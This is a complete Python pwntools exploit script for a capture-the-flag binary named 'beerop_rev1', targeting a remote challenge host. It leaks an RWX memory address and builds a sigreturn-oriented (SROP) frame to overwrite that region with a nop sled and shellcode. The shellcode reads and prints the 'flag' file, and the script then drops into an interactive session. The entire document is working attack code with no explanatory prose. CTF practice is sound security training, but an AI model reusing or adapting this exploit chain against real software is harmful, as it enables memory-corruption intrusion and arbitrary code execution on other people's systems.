#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def logleak(name, val):  log.info(name+" = %#x" % val)

exe = ELF('./beerop_rev1')

host, port = "hctf.hackappatoi.com", "10007"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# get rwx zone address leak
leak = u64(p.recv(8))
logleak('mmaped zone address', leak)

# instructions copied in rwx zone (just for help)
'''
   0x00007fb9adcbf000:	mov    QWORD PTR [rsp-0x60],r13
   0x00007fb9adcbf005:	lea    rsi,[rsp-0x60]
   0x00007fb9adcbf00a:	ret
   0x00007fb9adcbf00b:	nop
   0x00007fb9adcbf00c:	pop    rbp
   0x00007fb9adcbf00d:	ret
   0x00007fb9adcbf00e:	mov    eax,0x1
   0x00007fb9adcbf013:	mov    edi,0x1
   0x00007fb9adcbf018:	mov    edx,0x8
   0x00007fb9adcbf01d:	syscall
   0x00007fb9adcbf01f:	ret
   0x00007fb9adcbf020:	pop    rdi
   0x00007fb9adcbf021:	ret
   0x00007fb9adcbf022:	nop
   0x00007fb9adcbf023:	pop    rbp
   0x00007fb9adcbf024:	ret
'''
# gadgets in rwx zone
pop_rbp = leak+0x23
pop_rdi = leak+0x20
syscall_ret = leak+0x1d
write = leak+0xe

frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0
frame.rdi = 0
frame.rsi = leak
frame.rdx = 0x200
frame.rsp = leak+0x100
frame.rip = syscall_ret
frame = bytes(frame)

print(hexdump(frame))

# payload that
# set rax to 0 with fsync, do a second read to set rax=15 for the sigrop, then call sigrop that overwrite RWX zone with our shellcode
# after the sycall/ret in rwx, it will return to our shellcode
#
payload = b'/bin/sh\x00'+b'A'*0x18+p64(syscall_ret)+p64(syscall_ret)+p64(syscall_ret)+frame
payload = payload.ljust(306, b'\x00')
# send a payload of 306 bytes length, to call syncfs (that will set rax to zero
p.send(payload)

sleep(2)
# send 15 chars, to set rax=15 for the sigrop
p.send('A'*0xf)

sleep(2)

#Â simple shellcoce that open 'flag' file and dump it to stdout
shellc = asm('''
  // open
  lea rdi,fname[rip]
  xor esi,esi
  push 2
  pop rax
  syscall

  // sendfile
  mov esi,eax
  push 1
  pop rdi
  xor edx,edx
  push 120
  pop r10
  push 40
  pop rax
  syscall

  // exit
  xor eax,eax
  push 60
  pop rax
  syscall
fname:
  .string "./flag"

''')

# construct payload that will overwrite rwx zone, with a nopsled + our shellcode
# will be called when returning from syscall/ret
payload2 = b'\x90'*0x30+shellc
payload2 = payload2.ljust(0x100,b'\x90')
payload2 += p64(leak)	# return address
p.send(payload2)

p.interactive()

